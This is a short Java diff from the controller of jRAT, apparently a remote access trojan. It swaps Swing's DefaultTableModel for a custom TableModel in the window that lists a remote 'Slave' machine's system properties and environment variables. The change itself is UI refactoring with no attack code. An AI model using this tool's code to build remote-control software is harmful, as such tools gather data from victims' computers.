@@ -23,12 +23,12 @@ import javax.swing.JScrollPane;
 import javax.swing.JTable;
 import javax.swing.LayoutStyle.ComponentPlacement;
 import javax.swing.border.EmptyBorder;
-import javax.swing.table.DefaultTableModel;
 
 import se.jrat.controller.Constants;
 import se.jrat.controller.Slave;
 import se.jrat.controller.packets.outgoing.Packet90SystemProperties;
 import se.jrat.controller.packets.outgoing.Packet96EnvironmentVariables;
+import se.jrat.controller.ui.components.TableModel;
 import se.jrat.controller.ui.components.DefaultJTable;
 
 
@@ -38,7 +38,7 @@ public class FrameSystemVariables extends BaseFrame {
 	private JPanel contentPane;
 	public JTable table;
 	public static final Map<Slave, FrameSystemVariables> INSTANCES = new HashMap<Slave, FrameSystemVariables>();
-	public DefaultTableModel model;
+	public TableModel model;
 
 	public FrameSystemVariables(final int mode, Slave s) {
 		super(s);
@@ -115,7 +115,7 @@ public class FrameSystemVariables extends BaseFrame {
 		gl_contentPane.setVerticalGroup(gl_contentPane.createParallelGroup(Alignment.LEADING).addGroup(gl_contentPane.createSequentialGroup().addComponent(scrollPane, GroupLayout.PREFERRED_SIZE, 218, GroupLayout.PREFERRED_SIZE).addPreferredGap(ComponentPlacement.UNRELATED).addGroup(gl_contentPane.createParallelGroup(Alignment.BASELINE).addComponent(btnReload).addComponent(btnSave).addComponent(btnClose)).addContainerGap(GroupLayout.DEFAULT_SIZE, Short.MAX_VALUE)));
 
 		table = new DefaultJTable();
-		table.setModel(model = new DefaultTableModel(new Object[][] {}, new String[] { "Key", "Value" }));
+		table.setModel(model = new TableModel(new Object[][] {}, new String[] { "Key", "Value" }));
 		table.getColumnModel().getColumn(0).setPreferredWidth(163);
 		table.getColumnModel().getColumn(1).setPreferredWidth(268);
 		scrollPane.setViewportView(table);
